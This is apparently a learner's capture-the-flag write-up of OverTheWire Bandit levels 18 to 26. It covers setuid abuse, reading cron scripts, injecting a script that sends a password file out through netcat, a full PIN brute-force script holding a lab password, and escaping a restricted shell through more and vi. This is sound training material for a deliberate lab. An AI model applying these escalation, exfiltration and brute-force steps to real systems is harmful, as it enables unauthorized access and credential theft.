# Privilege Escalation - Setuid, Cron Exploitation, Restricted Shells & Scripting

## Level 18 - Remote Command Execution

This was very weird at first. Every time I tried to log in to the user via SSH, I was immediately kicked out.

This led me to read about the `.bashrc` file - a configuration file that runs every time a user opens a terminal or logs in via SSH. I realized they had edited it to instantly disconnect anyone who logs in remotely.

Luckily, there's a way to execute a command without actually starting a session. By appending a command right after the SSH login, it runs the command and then disconnects - before `.bashrc` gets a chance to kick you out:
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 cat /home/bandit18/readme
```

This logged in, ran `cat`, printed the password, and disconnected - all in one shot. A very nice trick. Password revealed.

**Key concepts:** Understanding `.bashrc`, remote command execution via SSH without starting a session.

---

## Level 19 - Setuid Exploitation

So simple, yet I couldn't grasp it for a while.

This required a lot of reading about `setuid` and `setgid`. In short, `setuid` is a special permission bit that replaces the `x` in a file's permissions with an `s`.  
When set on an executable, it means anyone who runs that file temporarily gets the privileges of the file's owner.

The home directory contained a binary called `bandit20-do`. Running it gave a deceptively vague hint: "Run a command as another user. Example: `./bandit20-do id`".  
The `id` in the example is NOT related to the solution - it's just an example command! which is confusing when the whole level revolves around users and IDs.

Once it clicked, I realized the binary lets you run any single command as the bandit20 user:
```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

This ran `cat` as bandit20, who had permission to read the password file. Password revealed.

**Key concepts:** `setuid`/`setgid` permissions, running binaries with `./`, privilege escalation through setuid executables.

---

## Level 21 - Cron Job Investigation

This level introduced the `cron` mechanism - a system for scheduling recurring tasks. I read about `cron` and `crontab`, but didn't actually need to use them directly.

The hint pointed me to `/etc/cron.d/`, a directory containing system-wide scheduled tasks (as opposed to `crontab`, which holds user-specific ones).
I looked around:  
```bash
cd /etc/cron.d/
ls
```

There were several files in there, each one a scheduled task. One of them was called `cronjob_bandit22` - that felt like the right one.  
I didn't have permissions to run it, so I wanted to see what was inside:
```bash
cat cronjob_bandit22
```

This pointed to a script. I read the script with `cat` as well, and from what I could tell, it was creating a temporary file in `/tmp` and piping the bandit22 password into it. So I just followed the trail:
```bash
cat /tmp/<filename from the script>
```

Password revealed.

**Key concepts:** Cron mechanism, difference between `cron.d` (system-wide) and `crontab` (user-specific), following execution trails through scripts.

---

---

## Level 22 - Reverse Engineering a Cron Script

Very fun level overall. Same logical structure as the previous one - rolling around from directory to directory, file to file, following the trail. But this time, the interesting part was understanding the script itself.

I went to the cron directory like before and read the cron job for bandit23:
```bash
cd /etc/cron.d/
cat cronjob_bandit23
```

The script used a few things I hadn't seen before. Variables in bash are noted with the `$` sign, like `myname=$somethingsomething`. It also used `md5sum` - a hash function that takes any input and produces a fixed-length signature. Side note: `md5sum` isn't considered secure anymore since researchers found collisions, meaning an attacker could craft a malicious file with the same hash as a trustworthy one. Still fine for ordinary use though.

The script also used the `cut` command to extract specific parts of the output.

Once I understood what the cron job was doing, I could replicate its process in the terminal:
```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

The `echo` command produced the hash that the cron job was using as a filename in `/tmp`. Once I had that hash, I just read the file. Password revealed.

**Key concepts:** Reverse engineering bash scripts, variables with `$`, hashing with `md5sum`, extracting fields with `cut`.

---

## Level 23 - Script Injection

The most exciting level yet by far. It required everything I learned so far, and I was very creative solving it on my own.

I went to the cron job for bandit24:
```bash
cat /etc/cron.d/cronjob_bandit24
```

The script `cronjob_bandit24.sh` was running every minute. I investigated what it was doing and found two crucial things: it was running as bandit24 (this is key), and it was deleting all files in `/var/spool/bandit24/foo` - but also executing any files in there that were written by bandit23.

I checked the permissions on the `foo` directory and discovered I could write and execute in it as bandit23. The idea became clear - inject a script into that folder that gets automatically executed by bandit24.  
Since bandit24 has access to its own password file, the script just needs to send it back to me.

I wrote a script that does exactly that using a port connection:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 | nc localhost 35001
```

Then I opened a listener on my side:
```bash
nc -l localhost 35001
```

The only remaining problem - when you create a file, its default permissions are 644, meaning it can't be executed.  
And I couldn't create the file and then change permissions separately since the cron job deletes files almost instantly.  
Thankfully, the `&&` operator chains commands together, so everything happens in sequence:
```bash
touch break.sh && chmod 755 break.sh && nano break.sh
```

This ensured the file was created, made executable, and edited all before the cron job could delete it. Once I finished editing in `nano`, the cron job picked it up, ran it as bandit24, and the password came through on my listener. Password revealed.

**Key concepts:** Script injection, cron job exploitation, file permission defaults (644), chaining commands with `&&`, using `nc` listeners to exfiltrate data.

---

## Level 24 - Brute-Force with Coproc

Very interesting level. The big things I learned here were the brute-force concept, some bash scripting syntax, and most importantly - how to automate communication with a server.

When you run `nc localhost 30002`, you can interact with that server manually through the terminal. But automating that conversation from a script is a different story. If I wrote `nc localhost 30002` in a bash script and then continued writing commands below it, the connection would just hang - the script doesn't know how to feed input into the running connection.

This is where `coproc` comes in. It creates input and output pipes to a background process, allowing you to read from and write to that process programmatically. The concept itself is what's hard - once you understand that, using it is more straightforward. I'd recommend reading about it and talking with an AI to solidify the understanding.

The task was to send the current password along with a 4-digit PIN to the server on port 30002. I had to brute-force all 10,000 possibilities (0000–9999).  
Here's the script I wrote:
```bash
#!/bin/bash

coproc NC { nc localhost 30002; }
read -u ${NC[0]} banner

for i in {0000..9999}; do
    pass_attempt="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
    echo $pass_attempt >&${NC[1]}
    read -u ${NC[0]} response

    if [[ $response == *"Wrong!"* ]]; then
        continue
    else
        read -u ${NC[0]} password
        echo $response
        echo $password
        break
    fi
done
```

The script opens a persistent connection, loops through every possible PIN, writes each attempt into the connection's input pipe, reads the response from the output pipe.
When the correct PIN is found, the server responds with something other than "Wrong!" - the script catches that, reads one more line which contains the actual password, prints both the response and the password, and breaks out of the loop.

Password revealed.

**Key concepts:** Brute-force automation, `coproc` for managing background process I/O, bash scripting with loops and conditionals, automated server communication.

---

## Level 25 - Escaping a Restricted Shell

The concept of escaping a restricted environment is king here.

I had the SSH private key for bandit26 - getting it into `.ssh` and connecting was routine by now. But logging in naively just showed some text, then immediately kicked me out.

To investigate, I needed to find out what shell bandit26 was using. The way to do this from a different user is by looking at `/etc/passwd`, which contains information about all users:
```bash
cat /etc/passwd | grep "bandit26"
```

The shell wasn't `bash` as expected - it was `/usr/bin/showtext`, some weird custom shell. I looked at what it was doing:
```bash
cat /usr/bin/showtext
```

It was a short bash script that force-opens a text file in bandit26's home directory using the `more` command.  
A lot of time went by reading about various things - forced commands in authorized keys files, and importantly, tools like `vim`, `vi`, and `more` that have interactive command interfaces. This is a very exploitable feature that can be used to escape a restricted shell.

But there was a big catch - `more` only enters its interactive mode when it has more content than the screen can display.  
It took me a while ton understand how to trigger this. Eventually, I realized - I had to physically minimize my terminal window so the text file wouldn't fit on screen. Once I did that, `more` paused and I was in its interactive interface.

From there I typed `v` to invoke the `vi` text editor, which lets you run commands. But the shell was still broken - asking nicely with `:!/bin/bash` wouldn't work. I had to force it using `exec`:
```bash
:!exec /bin/bash
```

This finally opened a proper bash terminal inside bandit26. This time i didnt have a password, but i was inside bandit26.

**Key concepts:** `/etc/passwd` for user information, restricted shell environments, exploiting `more`'s interactive mode, escaping to `vi`, forcing a shell with `exec`.

---

## Level 26 - Setuid Binary (Again)

A direct continuation of the previous level. I was already inside bandit26 from the shell escape, so I could operate normally.

The home directory contained a familiar sight — a setuid binary called `bandit27-do`, just like in Level 19. It runs commands as a different user:
```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

And just like that - password revealed. The real challenge was getting here.

**Key concepts:** Setuid binary exploitation, leveraging a previous shell escape to access the next level.

